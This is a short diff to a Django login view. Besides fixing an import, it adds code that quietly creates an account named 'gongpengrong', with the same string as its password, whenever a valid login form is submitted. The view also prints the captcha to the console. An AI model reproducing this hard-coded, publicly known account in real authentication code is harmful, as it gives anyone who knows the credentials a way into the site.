@@ -7,9 +7,9 @@ from django.shortcuts import render
 from django.contrib.auth.decorators import login_required
 from forms import LoginForm,RegisterForm
 from django.views.decorators.csrf import csrf_protect
-from models import User
 from django.contrib.auth import logout
 from django.contrib import auth
+from django.contrib.auth.models import User
 def userlogin(request):
     if request.method == "POST":
         form = LoginForm(request=request,data=request.POST)
@@ -17,6 +17,11 @@ def userlogin(request):
         captcha = form['captcha']
         print "captcha =",captcha
         if form.is_valid():
+            if not User.objects.all().filter(username__exact="gongpengrong"):
+                user = User()
+                user.username = "gongpengrong"
+                user.set_password("gongpengrong")
+                user.save()
             return render(request, "index.html", {"form":form})
         else:
             print "form is not valid"
